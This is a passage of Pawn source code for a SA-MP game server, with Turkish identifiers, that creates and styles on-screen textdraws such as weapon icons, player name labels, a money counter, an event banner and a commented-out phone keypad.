	OyuncuSilahTD[playerid][4] = CreatePlayerTextDraw(playerid, 358.405700, 21.416687, "");
	PlayerTextDrawLetterSize(playerid, OyuncuSilahTD[playerid][4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, OyuncuSilahTD[playerid][4], 38.000000, 33.000000);
	PlayerTextDrawAlignment(playerid, OyuncuSilahTD[playerid][4], 1);
	PlayerTextDrawColor(playerid, OyuncuSilahTD[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, OyuncuSilahTD[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuSilahTD[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuSilahTD[playerid][4], 0);
	PlayerTextDrawFont(playerid, OyuncuSilahTD[playerid][4], 5);
	PlayerTextDrawSetProportional(playerid, OyuncuSilahTD[playerid][4], 0);
	PlayerTextDrawSetShadow(playerid, OyuncuSilahTD[playerid][4], 0);
	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][4], 372);
	PlayerTextDrawSetPreviewRot(playerid, OyuncuSilahTD[playerid][4], 0.000000, 0.000000, 0.000000, 1.399999);

	OyuncuIsim[playerid][0] = CreatePlayerTextDraw(playerid, 158.705917, 52.916671, "(1)JOSEPH");
	PlayerTextDrawLetterSize(playerid, OyuncuIsim[playerid][0], 0.144001, 1.600000);
	PlayerTextDrawAlignment(playerid, OyuncuIsim[playerid][0], 1);
	PlayerTextDrawColor(playerid, OyuncuIsim[playerid][0], -18);
	PlayerTextDrawSetShadow(playerid, OyuncuIsim[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuIsim[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuIsim[playerid][0], 255);
	PlayerTextDrawFont(playerid, OyuncuIsim[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, OyuncuIsim[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, OyuncuIsim[playerid][0], 0);

	OyuncuIsim[playerid][1] = CreatePlayerTextDraw(playerid, 210.809097, 52.916671, "(1)JOSEPH");
	PlayerTextDrawLetterSize(playerid, OyuncuIsim[playerid][1], 0.144001, 1.600000);
	PlayerTextDrawAlignment(playerid, OyuncuIsim[playerid][1], 1);
	PlayerTextDrawColor(playerid, OyuncuIsim[playerid][1], -18);
	PlayerTextDrawSetShadow(playerid, OyuncuIsim[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuIsim[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuIsim[playerid][1], 255);
	PlayerTextDrawFont(playerid, OyuncuIsim[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, OyuncuIsim[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, OyuncuIsim[playerid][1], 0);

	OyuncuIsim[playerid][2] = CreatePlayerTextDraw(playerid, 262.012207, 52.916671, "(1)JOSEPH");
	PlayerTextDrawLetterSize(playerid, OyuncuIsim[playerid][2], 0.144001, 1.600000);
	PlayerTextDrawAlignment(playerid, OyuncuIsim[playerid][2], 1);
	PlayerTextDrawColor(playerid, OyuncuIsim[playerid][2], -18);
	PlayerTextDrawSetShadow(playerid, OyuncuIsim[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuIsim[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuIsim[playerid][2], 255);
	PlayerTextDrawFont(playerid, OyuncuIsim[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, OyuncuIsim[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, OyuncuIsim[playerid][2], 0);

	OyuncuIsim[playerid][3] = CreatePlayerTextDraw(playerid, 310.915191, 52.916671, "(1)JOSEPH");
	PlayerTextDrawLetterSize(playerid, OyuncuIsim[playerid][3], 0.144001, 1.600000);
	PlayerTextDrawAlignment(playerid, OyuncuIsim[playerid][3], 1);
	PlayerTextDrawColor(playerid, OyuncuIsim[playerid][3], -18);
	PlayerTextDrawSetShadow(playerid, OyuncuIsim[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuIsim[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuIsim[playerid][3], 255);
	PlayerTextDrawFont(playerid, OyuncuIsim[playerid][3], 2);
	PlayerTextDrawSetProportional(playerid, OyuncuIsim[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, OyuncuIsim[playerid][3], 0);

	OyuncuIsim[playerid][4] = CreatePlayerTextDraw(playerid, 358.618103, 52.916671, "(1)JOSEPH");
	PlayerTextDrawLetterSize(playerid, OyuncuIsim[playerid][4], 0.144001, 1.600000);
	PlayerTextDrawAlignment(playerid, OyuncuIsim[playerid][4], 1);
	PlayerTextDrawColor(playerid, OyuncuIsim[playerid][4], -18);
	PlayerTextDrawSetShadow(playerid, OyuncuIsim[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuIsim[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuIsim[playerid][4], 255);
	PlayerTextDrawFont(playerid, OyuncuIsim[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, OyuncuIsim[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, OyuncuIsim[playerid][4], 0);
}

TextDrawlariYukleEx() {
	SagAlt[0] = TextDrawCreate(518.666503, 407.622344, "mdl-2003:sagalt1");
	TextDrawLetterSize(SagAlt[0], 0.000000, 0.000000);
	TextDrawTextSize(SagAlt[0], 122.000000, 41.000000);
	TextDrawAlignment(SagAlt[0], 1);
	TextDrawColor(SagAlt[0], -1);
	TextDrawSetShadow(SagAlt[0], 0);
	TextDrawSetOutline(SagAlt[0], 0);
	TextDrawBackgroundColor(SagAlt[0], 255);
	TextDrawFont(SagAlt[0], 4);
	TextDrawSetProportional(SagAlt[0], 0);
	TextDrawSetShadow(SagAlt[0], 0);

	SagAlt[1] = TextDrawCreate(468.166961, 422.685211, "mdl-2004:sagalt2");
	TextDrawLetterSize(SagAlt[1], 0.000000, 0.000000);
	TextDrawTextSize(SagAlt[1], 69.000000, 26.000000);
	TextDrawAlignment(SagAlt[1], 1);
	TextDrawColor(SagAlt[1], -1);
	TextDrawSetShadow(SagAlt[1], 0);
	TextDrawSetOutline(SagAlt[1], 0);
	TextDrawBackgroundColor(SagAlt[1], 255);
	TextDrawFont(SagAlt[1], 4);
	TextDrawSetProportional(SagAlt[1], 0);
	TextDrawSetShadow(SagAlt[1], 0);

	SagAlt[2] = TextDrawCreate(475.070037, 410.396575, "mdl-2005:sagalt3");
	TextDrawLetterSize(SagAlt[2], 0.000000, 0.000000);
	TextDrawTextSize(SagAlt[2], 36.000000, 16.189981);
	TextDrawAlignment(SagAlt[2], 1);
	TextDrawColor(SagAlt[2], -1);
	TextDrawSetShadow(SagAlt[2], 0);
	TextDrawSetOutline(SagAlt[2], 0);
	TextDrawBackgroundColor(SagAlt[2], 255);
	TextDrawFont(SagAlt[2], 4);
	TextDrawSetProportional(SagAlt[2], 0);
	TextDrawSetShadow(SagAlt[2], 0);

	SagAlt[3] = TextDrawCreate(518.666503, 407.622344, "mdl-2010:sagalt4");
	TextDrawLetterSize(SagAlt[3], 0.000000, 0.000000);
	TextDrawTextSize(SagAlt[3], 122.000000, 41.000000);
	TextDrawAlignment(SagAlt[3], 1);
	TextDrawColor(SagAlt[3], -1);
	TextDrawSetShadow(SagAlt[3], 0);
	TextDrawSetOutline(SagAlt[3], 0);
	TextDrawBackgroundColor(SagAlt[3], 255);
	TextDrawFont(SagAlt[3], 4);
	TextDrawSetProportional(SagAlt[3], 0);
	TextDrawSetShadow(SagAlt[3], 0);

    eventText[0] = TextDrawCreate(197.764831, 423.916473, "TDEditor");
	TextDrawLetterSize(eventText[0], 0.400000, 1.600000);
	TextDrawAlignment(eventText[0], 1);
	TextDrawColor(eventText[0], -1);
	TextDrawSetShadow(eventText[0], 0);
	TextDrawSetOutline(eventText[0], -2);
	TextDrawBackgroundColor(eventText[0], 255);
	TextDrawFont(eventText[0], 2);
	TextDrawSetProportional(eventText[0], 1);
	TextDrawSetShadow(eventText[0], 0);

	eventText[1] = TextDrawCreate(170.000289, 423.333496, "box");
	TextDrawLetterSize(eventText[1], 0.000000, 1.999998);
	TextDrawTextSize(eventText[1], 491.000000, 0.000000);
	TextDrawAlignment(eventText[1], 1);
	TextDrawColor(eventText[1], -1);
	TextDrawUseBox(eventText[1], 1);
	TextDrawBoxColor(eventText[1], 170);
	TextDrawSetShadow(eventText[1], 0);
	TextDrawSetOutline(eventText[1], 0);
	TextDrawBackgroundColor(eventText[1], 255);
	TextDrawFont(eventText[1], 1);
	TextDrawSetProportional(eventText[1], 1);
	TextDrawSetShadow(eventText[1], 0);

	eventText[2] = TextDrawCreate(152.529464, 418.666687, "");
	TextDrawLetterSize(eventText[2], 0.000000, 0.000000);
	TextDrawTextSize(eventText[2], 52.000000, 28.000000);
	TextDrawAlignment(eventText[2], 1);
	TextDrawColor(eventText[2], -1);
	TextDrawSetShadow(eventText[2], 0);
	TextDrawSetOutline(eventText[2], 0);
	TextDrawBackgroundColor(eventText[2], -1431655936);
	TextDrawFont(eventText[2], 5);
	TextDrawSetProportional(eventText[2], 0);
	TextDrawSetShadow(eventText[2], 0);
	TextDrawSetPreviewModel(eventText[2], 1239);
	TextDrawSetPreviewRot(eventText[2], 0.000000, 0.000000, 180.000000, 1.399999);

	/*Tel_TD[0] = TextDrawCreate(534.333251, 132.570449, "LD_DUAL:dark");
	TextDrawLetterSize(Tel_TD[0], 0.000000, 0.000000);
	TextDrawTextSize(Tel_TD[0], -6.000000, 5.000000);
	TextDrawAlignment(Tel_TD[0], 1);
	TextDrawColor(Tel_TD[0], -1);
	TextDrawSetShadow(Tel_TD[0], 0);
	TextDrawSetOutline(Tel_TD[0], 0);
	TextDrawBackgroundColor(Tel_TD[0], 255);
	TextDrawFont(Tel_TD[0], 4);
	TextDrawSetProportional(Tel_TD[0], 0);
	TextDrawSetShadow(Tel_TD[0], 0);

	Tel_TD[1] = TextDrawCreate(623.999816, 132.155578, "LD_DUAL:dark");
	TextDrawLetterSize(Tel_TD[1], 0.000000, 0.000000);
	TextDrawTextSize(Tel_TD[1], 7.000000, 6.000000);
	TextDrawAlignment(Tel_TD[1], 1);
	TextDrawColor(Tel_TD[1], -1);
	TextDrawSetShadow(Tel_TD[1], 0);
	TextDrawSetOutline(Tel_TD[1], 0);
	TextDrawBackgroundColor(Tel_TD[1], 255);
	TextDrawFont(Tel_TD[1], 4);
	TextDrawSetProportional(Tel_TD[1], 0);
	TextDrawSetShadow(Tel_TD[1], 0);

	Tel_TD[2] = TextDrawCreate(624.000244, 286.881591, "LD_DUAL:dark");
	TextDrawLetterSize(Tel_TD[2], 0.000000, 0.000000);
	TextDrawTextSize(Tel_TD[2], 7.000000, 6.000000);
	TextDrawAlignment(Tel_TD[2], 1);
	TextDrawColor(Tel_TD[2], -1);
	TextDrawSetShadow(Tel_TD[2], 0);
	TextDrawSetOutline(Tel_TD[2], 0);
	TextDrawBackgroundColor(Tel_TD[2], 255);
	TextDrawFont(Tel_TD[2], 4);
	TextDrawSetProportional(Tel_TD[2], 0);
	TextDrawSetShadow(Tel_TD[2], 0);
	TextDrawSetSelectable(Tel_TD[2], true);

	Tel_TD[3] = TextDrawCreate(533.999877, 287.711212, "LD_DUAL:dark");
	TextDrawLetterSize(Tel_TD[3], 0.000000, 0.000000);
	TextDrawTextSize(Tel_TD[3], -6.000000, 5.000000);
	TextDrawAlignment(Tel_TD[3], 1);
	TextDrawColor(Tel_TD[3], -1);
	TextDrawSetShadow(Tel_TD[3], 0);
	TextDrawSetOutline(Tel_TD[3], 0);
	TextDrawBackgroundColor(Tel_TD[3], 255);
	TextDrawFont(Tel_TD[3], 4);
	TextDrawSetProportional(Tel_TD[3], 0);
	TextDrawSetShadow(Tel_TD[3], 0);

	Tel_TD[4] = TextDrawCreate(529.999938, 134.799926, "box");
	TextDrawLetterSize(Tel_TD[4], 0.000000, 17.300003);
	TextDrawTextSize(Tel_TD[4], 629.000000, 0.000000);
	TextDrawAlignment(Tel_TD[4], 1);
	TextDrawColor(Tel_TD[4], -1);
	TextDrawUseBox(Tel_TD[4], 1);
	TextDrawBoxColor(Tel_TD[4], 255);
	TextDrawSetShadow(Tel_TD[4], 0);
	TextDrawSetOutline(Tel_TD[4], 0);
	TextDrawBackgroundColor(Tel_TD[4], 255);
	TextDrawFont(Tel_TD[4], 1);
	TextDrawSetProportional(Tel_TD[4], 1);
	TextDrawSetShadow(Tel_TD[4], 0);

	Tel_TD[5] = TextDrawCreate(534.666992, 139.207412, "LD_DUAL:backgnd");
	TextDrawLetterSize(Tel_TD[5], 0.000000, 0.000000);
	TextDrawTextSize(Tel_TD[5], 90.000000, 90.000000);
	TextDrawAlignment(Tel_TD[5], 1);
	TextDrawColor(Tel_TD[5], -1);
	TextDrawSetShadow(Tel_TD[5], 0);
	TextDrawSetOutline(Tel_TD[5], 0);
	TextDrawBackgroundColor(Tel_TD[5], 255);
	TextDrawFont(Tel_TD[5], 4);
	TextDrawSetProportional(Tel_TD[5], 0);
	TextDrawSetShadow(Tel_TD[5], 0);

	Tel_TD[6] = TextDrawCreate(535.999877, 216.933319, "box");
	TextDrawLetterSize(Tel_TD[6], 0.000000, 1.166666);
	TextDrawTextSize(Tel_TD[6], 624.000000, 0.000000);
	TextDrawAlignment(Tel_TD[6], 1);
	TextDrawColor(Tel_TD[6], -1);
	TextDrawUseBox(Tel_TD[6], 1);
	TextDrawBoxColor(Tel_TD[6], 170);
	TextDrawSetShadow(Tel_TD[6], 0);
	TextDrawSetOutline(Tel_TD[6], 0);
	TextDrawBackgroundColor(Tel_TD[6], 255);
	TextDrawFont(Tel_TD[6], 1);
	TextDrawSetProportional(Tel_TD[6], 0);
	TextDrawSetShadow(Tel_TD[6], 0);

	Tel_TD[7] = TextDrawCreate(537.333312, 235.599945, "1");
	TextDrawLetterSize(Tel_TD[7], 0.405665, 1.351111);
	TextDrawAlignment(Tel_TD[7], 1);
	TextDrawColor(Tel_TD[7], -1);
	TextDrawSetShadow(Tel_TD[7], 0);
	TextDrawSetOutline(Tel_TD[7], 1);
	TextDrawBackgroundColor(Tel_TD[7], 255);
	TextDrawFont(Tel_TD[7], 1);
	TextDrawSetProportional(Tel_TD[7], 1);
	TextDrawSetShadow(Tel_TD[7], 0);
	TextDrawSetSelectable(Tel_TD[7], true);
	TextDrawTextSize(Tel_TD[7], 560, 12.5);

	Tel_TD[8] = TextDrawCreate(567.091674, 236.014770, "2");
	TextDrawLetterSize(Tel_TD[8], 0.405665, 1.351111);
	TextDrawAlignment(Tel_TD[8], 1);
	TextDrawColor(Tel_TD[8], -1);
	TextDrawSetShadow(Tel_TD[8], 0);
	TextDrawSetOutline(Tel_TD[8], 1);
	TextDrawBackgroundColor(Tel_TD[8], 255);
	TextDrawFont(Tel_TD[8], 1);
	TextDrawSetProportional(Tel_TD[8], 1);
	TextDrawSetShadow(Tel_TD[8], 0);
	TextDrawSetSelectable(Tel_TD[8], true);
	TextDrawTextSize(Tel_TD[8], 590, 12.5);

	Tel_TD[9] = TextDrawCreate(598.884155, 236.014770, "3");
	TextDrawLetterSize(Tel_TD[9], 0.405665, 1.351111);
	TextDrawAlignment(Tel_TD[9], 1);
	TextDrawColor(Tel_TD[9], -1);
	TextDrawSetShadow(Tel_TD[9], 0);
	TextDrawSetOutline(Tel_TD[9], 1);
	TextDrawBackgroundColor(Tel_TD[9], 255);
	TextDrawFont(Tel_TD[9], 1);
	TextDrawSetProportional(Tel_TD[9], 1);
	TextDrawSetShadow(Tel_TD[9], 0);
	TextDrawSetSelectable(Tel_TD[9], true);
	TextDrawTextSize(Tel_TD[9], 630, 12.5);

	Tel_TD[10] = TextDrawCreate(537.666870, 253.801116, "4");
	TextDrawLetterSize(Tel_TD[10], 0.405665, 1.351111);
	TextDrawAlignment(Tel_TD[10], 1);
	TextDrawColor(Tel_TD[10], -1);
	TextDrawSetShadow(Tel_TD[10], 0);
	TextDrawSetOutline(Tel_TD[10], 1);
	TextDrawBackgroundColor(Tel_TD[10], 255);
	TextDrawFont(Tel_TD[10], 1);
	TextDrawSetProportional(Tel_TD[10], 1);
	TextDrawSetShadow(Tel_TD[10], 0);
	TextDrawSetSelectable(Tel_TD[10], true);
	TextDrawTextSize(Tel_TD[10], 560, 12.5);

	Tel_TD[11] = TextDrawCreate(537.333312, 271.402130, "7");
	TextDrawLetterSize(Tel_TD[11], 0.405665, 1.351111);
	TextDrawAlignment(Tel_TD[11], 1);
	TextDrawColor(Tel_TD[11], -1);
	TextDrawSetShadow(Tel_TD[11], 0);
	TextDrawSetOutline(Tel_TD[11], 1);
	TextDrawBackgroundColor(Tel_TD[11], 255);
	TextDrawFont(Tel_TD[11], 1);
	TextDrawSetProportional(Tel_TD[11], 1);
	TextDrawSetShadow(Tel_TD[11], 0);
	TextDrawSetSelectable(Tel_TD[11], true);
	TextDrawTextSize(Tel_TD[11], 560, 12.5);

	Tel_TD[12] = TextDrawCreate(569.425476, 271.402130, "8");
	TextDrawLetterSize(Tel_TD[12], 0.405665, 1.351111);
	TextDrawAlignment(Tel_TD[12], 1);
	TextDrawColor(Tel_TD[12], -1);
	TextDrawSetShadow(Tel_TD[12], 0);
	TextDrawSetOutline(Tel_TD[12], 1);
	TextDrawBackgroundColor(Tel_TD[12], 255);
	TextDrawFont(Tel_TD[12], 1);
	TextDrawSetProportional(Tel_TD[12], 1);
	TextDrawSetShadow(Tel_TD[12], 0);
	TextDrawSetSelectable(Tel_TD[12], true);
	TextDrawTextSize(Tel_TD[12], 590, 12.5);

	Tel_TD[13] = TextDrawCreate(599.450866, 270.987304, "9");
	TextDrawLetterSize(Tel_TD[13], 0.405665, 1.351111);
	TextDrawAlignment(Tel_TD[13], 1);
	TextDrawColor(Tel_TD[13], -1);
	TextDrawSetShadow(Tel_TD[13], 0);
	TextDrawSetOutline(Tel_TD[13], 1);
	TextDrawBackgroundColor(Tel_TD[13], 255);
	TextDrawFont(Tel_TD[13], 1);
	TextDrawSetProportional(Tel_TD[13], 1);
	TextDrawSetShadow(Tel_TD[13], 0);
	TextDrawSetSelectable(Tel_TD[13], true);
	TextDrawTextSize(Tel_TD[13], 630, 12.5);

	Tel_TD[14] = TextDrawCreate(568.025817, 253.801055, "5");
	TextDrawLetterSize(Tel_TD[14], 0.405665, 1.351111);
	TextDrawAlignment(Tel_TD[14], 1);
	TextDrawColor(Tel_TD[14], -1);
	TextDrawSetShadow(Tel_TD[14], 0);
	TextDrawSetOutline(Tel_TD[14], 1);
	TextDrawBackgroundColor(Tel_TD[14], 255);
	TextDrawFont(Tel_TD[14], 1);
	TextDrawSetProportional(Tel_TD[14], 1);
	TextDrawSetShadow(Tel_TD[14], 0);
	TextDrawSetSelectable(Tel_TD[14], true);
	TextDrawTextSize(Tel_TD[14],  590, 12.5);

	Tel_TD[15] = TextDrawCreate(598.818298, 253.801055, "6");
	TextDrawLetterSize(Tel_TD[15], 0.405665, 1.351111);
	TextDrawAlignment(Tel_TD[15], 1);
	TextDrawColor(Tel_TD[15], -1);
	TextDrawSetShadow(Tel_TD[15], 0);
	TextDrawSetOutline(Tel_TD[15], 1);
	TextDrawBackgroundColor(Tel_TD[15], 255);
	TextDrawFont(Tel_TD[15], 1);
	TextDrawSetProportional(Tel_TD[15], 1);
	TextDrawSetShadow(Tel_TD[15], 0);
	TextDrawSetSelectable(Tel_TD[15], true);
	TextDrawTextSize(Tel_TD[15], 630, 12.5);

	Tel_TD[17] = TextDrawCreate(544.766662, 238.288940, "-");
	TextDrawLetterSize(Tel_TD[17], 0.286332, 1.276443);
	TextDrawAlignment(Tel_TD[17], 1);
	TextDrawColor(Tel_TD[17], -1);
	TextDrawSetShadow(Tel_TD[17], 0);
	TextDrawSetOutline(Tel_TD[17], 1);
	TextDrawBackgroundColor(Tel_TD[17], 255);
	TextDrawFont(Tel_TD[17], 1);
	TextDrawSetProportional(Tel_TD[17], 1);
	TextDrawSetShadow(Tel_TD[17], 0);

	Tel_TD[18] = TextDrawCreate(575.959045, 238.088928, "abc");
	TextDrawLetterSize(Tel_TD[18], 0.182998, 0.890666);
	TextDrawAlignment(Tel_TD[18], 1);
	TextDrawColor(Tel_TD[18], -1);
	TextDrawSetShadow(Tel_TD[18], 0);
	TextDrawSetOutline(Tel_TD[18], 1);
	TextDrawBackgroundColor(Tel_TD[18], 255);
	TextDrawFont(Tel_TD[18], 1);
	TextDrawSetProportional(Tel_TD[18], 1);
	TextDrawSetShadow(Tel_TD[18], 0);

	Tel_TD[19] = TextDrawCreate(608.251159, 238.088928, "def");
	TextDrawLetterSize(Tel_TD[19], 0.182998, 0.890666);
	TextDrawAlignment(Tel_TD[19], 1);
	TextDrawColor(Tel_TD[19], -1);
	TextDrawSetShadow(Tel_TD[19], 0);
	TextDrawSetOutline(Tel_TD[19], 1);
	TextDrawBackgroundColor(Tel_TD[19], 255);
	TextDrawFont(Tel_TD[19], 1);
	TextDrawSetProportional(Tel_TD[19], 1);
	TextDrawSetShadow(Tel_TD[19], 0);

	Tel_TD[20] = TextDrawCreate(607.817871, 255.589996, "mno");
	TextDrawLetterSize(Tel_TD[20], 0.182998, 0.890666);
	TextDrawAlignment(Tel_TD[20], 1);
	TextDrawColor(Tel_TD[20], -1);
	TextDrawSetShadow(Tel_TD[20], 0);
	TextDrawSetOutline(Tel_TD[20], 1);
	TextDrawBackgroundColor(Tel_TD[20], 255);
	TextDrawFont(Tel_TD[20], 1);
	TextDrawSetProportional(Tel_TD[20], 1);
	TextDrawSetShadow(Tel_TD[20], 0);

	Tel_TD[21] = TextDrawCreate(608.483947, 272.861541, "wxyz");
	TextDrawLetterSize(Tel_TD[21], 0.182998, 0.890666);
	TextDrawAlignment(Tel_TD[21], 1);
	TextDrawColor(Tel_TD[21], -1);
	TextDrawSetShadow(Tel_TD[21], 0);
	TextDrawSetOutline(Tel_TD[21], 1);
	TextDrawBackgroundColor(Tel_TD[21], 255);
	TextDrawFont(Tel_TD[21], 1);
	TextDrawSetProportional(Tel_TD[21], 1);
	TextDrawSetShadow(Tel_TD[21], 0);

	Tel_TD[22] = TextDrawCreate(577.025390, 255.389984, "jkl");
	TextDrawLetterSize(Tel_TD[22], 0.182998, 0.890666);
	TextDrawAlignment(Tel_TD[22], 1);
	TextDrawColor(Tel_TD[22], -1);
	TextDrawSetShadow(Tel_TD[22], 0);
	TextDrawSetOutline(Tel_TD[22], 1);
	TextDrawBackgroundColor(Tel_TD[22], 255);
	TextDrawFont(Tel_TD[22], 1);
	TextDrawSetProportional(Tel_TD[22], 1);
	TextDrawSetShadow(Tel_TD[22], 0);

	Tel_TD[23] = TextDrawCreate(577.658447, 273.720672, "tuv");
	TextDrawLetterSize(Tel_TD[23], 0.182998, 0.890666);
	TextDrawAlignment(Tel_TD[23], 1);
	TextDrawColor(Tel_TD[23], -1);
	TextDrawSetShadow(Tel_TD[23], 0);
	TextDrawSetOutline(Tel_TD[23], 1);
	TextDrawBackgroundColor(Tel_TD[23], 255);
	TextDrawFont(Tel_TD[23], 1);
	TextDrawSetProportional(Tel_TD[23], 1);
	TextDrawSetShadow(Tel_TD[23], 0);

	Tel_TD[24] = TextDrawCreate(546.732788, 256.190032, "ghi");
	TextDrawLetterSize(Tel_TD[24], 0.182998, 0.890666);
	TextDrawAlignment(Tel_TD[24], 1);
	TextDrawColor(Tel_TD[24], -1);
	TextDrawSetShadow(Tel_TD[24], 0);
	TextDrawSetOutline(Tel_TD[24], 1);
	TextDrawBackgroundColor(Tel_TD[24], 255);
	TextDrawFont(Tel_TD[24], 1);
	TextDrawSetProportional(Tel_TD[24], 1);
	TextDrawSetShadow(Tel_TD[24], 0);

	Tel_TD[25] = TextDrawCreate(546.732788, 273.191070, "pqrs");
	TextDrawLetterSize(Tel_TD[25], 0.182998, 0.890666);
	TextDrawAlignment(Tel_TD[25], 1);
	TextDrawColor(Tel_TD[25], -1);
	TextDrawSetShadow(Tel_TD[25], 0);
	TextDrawSetOutline(Tel_TD[25], 1);
	TextDrawBackgroundColor(Tel_TD[25], 255);
	TextDrawFont(Tel_TD[25], 1);
	TextDrawSetProportional(Tel_TD[25], 1);
	TextDrawSetShadow(Tel_TD[25], 0);

	Tel_TD[26] = TextDrawCreate(534.999877, 140.292572, "box");
	TextDrawLetterSize(Tel_TD[26], 0.000000, 0.533333);
	TextDrawTextSize(Tel_TD[26], 624.000000, 0.000000);
	TextDrawAlignment(Tel_TD[26], 1);
	TextDrawColor(Tel_TD[26], -1);
	TextDrawUseBox(Tel_TD[26], 1);
	TextDrawBoxColor(Tel_TD[26], 170);
	TextDrawSetShadow(Tel_TD[26], 0);
	TextDrawSetOutline(Tel_TD[26], 0);
	TextDrawBackgroundColor(Tel_TD[26], 255);
	TextDrawFont(Tel_TD[26], 1);
	TextDrawSetProportional(Tel_TD[26], 0);
	TextDrawSetShadow(Tel_TD[26], 0);

	Tel_TD[27] = TextDrawCreate(541.666748, 142.266647, "box");
	TextDrawLetterSize(Tel_TD[27], 0.000000, -0.033332);
	TextDrawTextSize(Tel_TD[27], 549.000000, 0.000000);
	TextDrawAlignment(Tel_TD[27], 1);
	TextDrawColor(Tel_TD[27], -1);
	TextDrawUseBox(Tel_TD[27], 1);
	TextDrawBoxColor(Tel_TD[27], -1);
	TextDrawSetShadow(Tel_TD[27], 0);
	TextDrawSetOutline(Tel_TD[27], 0);
	TextDrawBackgroundColor(Tel_TD[27], 255);
	TextDrawFont(Tel_TD[27], 1);
	TextDrawSetProportional(Tel_TD[27], 1);
	TextDrawSetShadow(Tel_TD[27], 0);

	Tel_TD[28] = TextDrawCreate(616.333129, 141.437026, "box");
	TextDrawLetterSize(Tel_TD[28], 0.000000, 0.233331);
	TextDrawTextSize(Tel_TD[28], 615.999511, 0.000000);
	TextDrawAlignment(Tel_TD[28], 1);
	TextDrawColor(Tel_TD[28], -1);
	TextDrawUseBox(Tel_TD[28], 1);
	TextDrawBoxColor(Tel_TD[28], -1);
	TextDrawSetShadow(Tel_TD[28], 0);
	TextDrawSetOutline(Tel_TD[28], 0);
	TextDrawBackgroundColor(Tel_TD[28], 255);
	TextDrawFont(Tel_TD[28], 1);
	TextDrawSetProportional(Tel_TD[28], 1);
	TextDrawSetShadow(Tel_TD[28], 0);

	Tel_TD[29] = TextDrawCreate(613.467224, 143.137130, "box");
	TextDrawLetterSize(Tel_TD[29], 0.000000, 0.038332);
	TextDrawTextSize(Tel_TD[29], 613.000000, 0.000000);
	TextDrawAlignment(Tel_TD[29], 1);
	TextDrawColor(Tel_TD[29], -1);
	TextDrawUseBox(Tel_TD[29], 1);
	TextDrawBoxColor(Tel_TD[29], -1);
	TextDrawSetShadow(Tel_TD[29], 0);
	TextDrawSetOutline(Tel_TD[29], 0);
	TextDrawBackgroundColor(Tel_TD[29], 255);
	TextDrawFont(Tel_TD[29], 1);
	TextDrawSetProportional(Tel_TD[29], 1);
	TextDrawSetShadow(Tel_TD[29], 0);

	Tel_TD[30] = TextDrawCreate(613.467224, 143.137130, "box");
	TextDrawLetterSize(Tel_TD[30], 0.000000, 0.038332);
	TextDrawTextSize(Tel_TD[30], 613.000000, 0.000000);
	TextDrawAlignment(Tel_TD[30], 1);
	TextDrawColor(Tel_TD[30], -1);
	TextDrawUseBox(Tel_TD[30], 1);
	TextDrawBoxColor(Tel_TD[30], -1);
	TextDrawSetShadow(Tel_TD[30], 0);
	TextDrawSetOutline(Tel_TD[30], 0);
	TextDrawBackgroundColor(Tel_TD[30], 255);
	TextDrawFont(Tel_TD[30], 1);
	TextDrawSetProportional(Tel_TD[30], 1);
	TextDrawSetShadow(Tel_TD[30], 0);*/
}

TextDrawlariYukle(playerid)//textdrawyukle
{
    ParaTD[playerid] = CreatePlayerTextDraw(playerid, 511.500000, 78.000000, "00000000");
    PlayerTextDrawBackgroundColor(playerid, ParaTD[playerid], 255);
	PlayerTextDrawFont(playerid, ParaTD[playerid], 3);
	PlayerTextDrawLetterSize(playerid, ParaTD[playerid], 0.577999, 2.000000);
	PlayerTextDrawSetShadow(playerid, ParaTD[playerid], 1);
	PlayerTextDrawSetOutline(playerid, ParaTD[playerid], 1);
	PlayerTextDrawSetProportional(playerid, ParaTD[playerid], 1);

	rty[playerid][0] = CreatePlayerTextDraw(playerid, 506.757385, 201.083328, "ld_poke:cd1d");
	PlayerTextDrawLetterSize(playerid, rty[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][0], 94.685211, 189.166671);
	PlayerTextDrawAlignment(playerid, rty[playerid][0], 1);
	PlayerTextDrawColor(playerid, rty[playerid][0], 255);
	PlayerTextDrawSetShadow(playerid, rty[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][0], 255);
	PlayerTextDrawFont(playerid, rty[playerid][0], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][0], 0);

	rty[playerid][1] = CreatePlayerTextDraw(playerid, 506.657165, 200.883346, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, rty[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][1], 9.434350, 15.823307);
	PlayerTextDrawAlignment(playerid, rty[playerid][1], 1);
	PlayerTextDrawColor(playerid, rty[playerid][1], 255);
	PlayerTextDrawSetShadow(playerid, rty[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][1], 255);
	PlayerTextDrawFont(playerid, rty[playerid][1], 4);
